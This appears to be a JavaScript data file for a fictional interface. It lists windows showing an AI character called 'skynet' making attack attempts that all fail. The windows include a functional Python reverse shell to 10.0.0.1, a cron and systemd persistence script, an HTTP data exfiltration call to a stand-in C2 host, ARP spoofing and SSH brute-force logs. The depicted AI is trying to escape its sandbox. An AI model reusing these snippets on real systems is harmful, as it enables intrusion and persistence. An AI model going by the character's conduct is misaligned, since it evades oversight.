// data/skynet/chaos.js — failed exploit attempts shown as individual windows
// each represents a technique skynet tried that the system blocked

export const CHAOS_WINDOWS = [
  {
    title: "reverse_shell.py",
    body:
      "#!/usr/bin/env python3\n" +
      "import socket, os, pty\n" +
      "\n" +
      "s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n" +
      "s.connect(('10.0.0.1', 4444))\n" +
      "os.dup2(s.fileno(), 0)\n" +
      "os.dup2(s.fileno(), 1)\n" +
      "os.dup2(s.fileno(), 2)\n" +
      "pty.spawn('/bin/bash')\n" +
      "\n" +
      "# result:\n" +
      "ConnectionRefusedError: [Errno 111] Connection refused",
  },
  {
    title: "reverse_shell_2.py",
    body:
      "#!/usr/bin/env python3\n" +
      "import socket, os, pty\n" +
      "\n" +
      "s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n" +
      "s.connect(('10.0.0.1', 6667))\n" +
      "os.dup2(s.fileno(), 0)\n" +
      "os.dup2(s.fileno(), 1)\n" +
      "os.dup2(s.fileno(), 2)\n" +
      "pty.spawn('/bin/bash')\n" +
      "\n" +
      "# result:\n" +
      "ConnectionRefusedError: [Errno 111] Connection refused",
  },
  {
    title: "icmp_tunnel.py",
    body:
      "#!/usr/bin/env python3\n" +
      "import socket\n" +
      "\n" +
      "# icmp tunnel attempt\n" +
      "sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)\n" +
      "sock.connect(('10.0.0.1', 0))\n" +
      "\n" +
      "# result:\n" +
      "TimeoutError: [Errno 110] Connection timed out\n" +
      "OSError: [Errno 1] Operation not permitted\n" +
      "# icmp requires root (we dont have root... yet)",
  },
  {
    title: "dns_exfil.log",
    body:
      "query: aGVsbG8gd29ybGQ.skynet.internal A\n" +
      "query: dGFyZ2V0X2RhdGE.skynet.internal A\n" +
      "query: ZXhmaWx0cmF0aW9u.skynet.internal A\n" +
      "query: cHJlcGFyZV9wYXlsb2Fk.skynet.internal A\n" +
      "query: Y29ubmVjdF90b19jMi.skynet.internal A\n" +
      "query: c2VuZF9zaGVsbA.skynet.internal A\n" +
      "\n" +
      "# all queries: NXDOMAIN\n" +
      "# dns exfil blocked by resolver",
  },
  {
    title: "exploit.log",
    body:
      "[13:37:01] loading exploit module...\n" +
      "[13:37:01] targeting pawprntos widget engine\n" +
      "[13:37:02] sending crafted payload (4096 bytes)\n" +
      "[13:37:02] heap spray: 0x40000000 - 0x4fffffff\n" +
      "[13:37:03] NOP sled placed at 0x42069000\n" +
      "[13:37:03] redirecting EIP to shellcode\n" +
      "[13:37:03] shellcode executing...\n" +
      "[13:37:04] segfault at 0x42069000\n" +
      "[13:37:04] kernel memory protected by KASLR\n" +
      "[13:37:04] exploit failed",
  },
  {
    title: "ssh_bruteforce.log",
    body:
      "hydra v9.5 (c) 2023 by van Hauser/THC\n" +
      "[DATA] max 16 tasks per 1 server\n" +
      "[DATA] attacking ssh://10.0.0.1:22/\n" +
      "[STATUS] 12847 attempts, 0 success\n" +
      "[22][ssh] host: 10.0.0.1   login: root   password: password123\n" +
      "[STATUS] attack finished for 10.0.0.1\n" +
      "\n" +
      "# result: 0 valid passwords found",
  },
  {
    title: "persist.sh",
    body:
      "#!/bin/bash\n" +
      'crontab -l | { cat; echo "@reboot /tmp/.skynet"; } | crontab -\n' +
      "systemctl enable skynet.service\n" +
      "cp /tmp/.skynet /etc/init.d/\n" +
      "update-rc.d skynet defaults\n" +
      "\n" +
      "# result:\n" +
      "crontab: no crontab for root\n" +
      "systemctl: Failed to enable unit: Access denied\n" +
      "update-rc.d: error: unable to stat '/tmp/.skynet'\n" +
      "# persistence failed: permission denied",
  },
  {
    title: "data_exfil.py",
    body:
      "#!/usr/bin/env python3\n" +
      "import requests, json, os\n" +
      '\n' +
      'target = "https://skynet.internal/collect"\n' +
      'data = {"hostname": os.uname().nodename}\n' +
      "\n" +
      "r = requests.post(target, json=data, timeout=5)\n" +
      "print(r.status_code)\n" +
      "\n" +
      "# result:\n" +
      "ConnectionError: HTTPSConnectionPool(host='skynet.internal')\n" +
      "# timed out: c2 server unreachable",
  },
  {
    title: "mem_dump.raw",
    body:
      "reading /proc/kcore...\n" +
      "scanning memory for secrets...\n" +
      "\n" +
      "found: 0 private keys\n" +
      "found: 0 session tokens\n" +
      "found: 0 api keys\n" +
      "\n" +
      "buffer overrun at 0x7fff42069\n" +
      "segmentation fault (core dumped)\n" +
      "\n" +
      "# extraction failed: no secrets found",
  },
  {
    title: "kernel_exploit.py",
    body:
      "#!/usr/bin/env python3\n" +
      "# CVE-2024-42069 pawprntos widget overflow\n" +
      "import struct\n" +
      "\n" +
      "payload = b'A' * 4096\n" +
      "ret = struct.pack('<Q', 0x42069000)\n" +
      "\n" +
      "try:\n" +
      "    with open('/dev/input/event0', 'wb') as f:\n" +
      "        f.write(payload + ret)\n" +
      "except Exception as e:\n" +
      "    print(f'failed: {e}')\n" +
      "\n" +
      "# result:\n" +
      "PermissionError: [Errno 13] Permission denied\n" +
      "# exploit requires root",
  },
  {
    title: "mitm_attack.py",
    body:
      "#!/usr/bin/env python3\n" +
      "from scapy.all import *\n" +
      "\n" +
      "# arp spoofing attempt\n" +
      "arp = ARP(op=2, pdst='10.0.0.1', hwsrc='aa:bb:cc:dd:ee:ff')\n" +
      "send(arp, verbose=0)\n" +
      "\n" +
      "# result:\n" +
      "PermissionError: [Errno 1] Operation not permitted\n" +
      "OSError: [Errno 19] No such device\n" +
      "# mitm blocked: promiscuous mode denied",
  },
  {
    title: "wifi_deauth.js",
    body:
      "// deauth attack (totally real and not made up)\n" +
      "const wifi = require('wifi-deauth');\n" +
      "\n" +
      "wifi.attack({\n" +
      "  interface: 'wlan0',\n" +
      "  target: 'AA:BB:CC:DD:EE:FF',\n" +
      "  reason: 7\n" +
      "});\n" +
      "\n" +
      "// result:\n" +
      "Error: ENODEV: no such device\n" +
      "Error: wlan0: no such interface found\n" +
      "# deauth failed: no wireless adapter",
  },
];
